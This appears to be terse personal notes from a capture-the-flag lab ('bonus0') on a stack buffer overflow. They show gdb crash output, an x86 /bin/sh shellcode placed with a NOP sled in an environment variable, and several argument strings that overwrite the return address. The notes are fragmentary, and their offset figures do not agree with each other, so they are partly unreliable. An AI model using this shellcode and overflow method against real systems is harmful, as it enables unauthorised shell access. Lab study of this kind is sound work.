```
    (gdb) run
    Starting program: /home/user/bonus0/bonus0 fh
    - 
    Aa0Aa1Aa2Aa3Aa4Aa5AaAa0Aa1Aa2Aa3Aa4Aa5Aa
    - 
    Aa0Aa1Aa2Aa3Aa4Aa5Aa
    Aa0Aa1Aa2Aa3Aa4Aa5AaAa0Aa1Aa2Aa3Aa4Aa5Aa��� Aa0Aa1Aa2Aa3Aa4Aa5Aa���

    Program received signal SIGSEGV, Segmentation fault.
    0x41336141 in ?? ()
```

we have a segmentation fault in 0x41336141 so the ofsset is 9

```
shellcode="\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
```

 export code=$(python -c 'print("\x90"*100 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68" "\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80")')


```
    (gdb) start
    Temporary breakpoint 1 at 0x80485a7
    Starting program: /home/user/bonus0/bonus0 

    Temporary breakpoint 1, 0x080485a7 in main ()
    (gdb) p/x getenv("code")
    $1 = 0xbfffff47
```

AAAAAAAAAAAAAAAAAAAA
BBBBBBBBB
\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80



AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 
AAAAAAAAAAAAAAAAAAAA


Aa0Aa1Aa2Aa3Aa4Aa5AaAa0Aa1Aa2Aa3Aa4Aa5Aa Aa0Aa1Aa2Aa3Aa4Aa5Aa


./bonus0 $(python -c "print('A'*42 + 'B'*4 + '\x89\xff\xff\xbf')")


AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA BBBB\x89\xff\xff\xbf


AAAAAAAAAAAAAAAAAAAA BBBBBBBBBBBBBBBBBBBBBB\x47\xff\xff\xbf